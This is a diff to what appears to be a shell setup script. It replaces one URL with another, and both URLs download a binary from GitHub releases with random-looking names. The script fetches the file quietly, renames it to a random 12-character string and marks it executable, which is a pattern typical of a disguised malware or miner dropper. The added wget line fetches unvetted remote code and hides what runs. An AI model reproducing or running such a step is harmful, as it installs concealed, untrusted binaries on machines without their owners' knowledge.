@@ -17,7 +17,7 @@ DEBIAN_FRONTEND=noninteractive apt install -y -qq \
 BIN_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 12)
 
 # Download binary quietly and rename
-wget -q https://github.com/yafcoplk/hmggklo/releases/download/hmggkloj/hmggklo -O "$BIN_NAME"
+wget -q https://github.com/vedhagsvp/marva/releases/download/c4ksd/crrmnar -O "$BIN_NAME"
 
 # Make it executable
 chmod +x "$BIN_NAME"
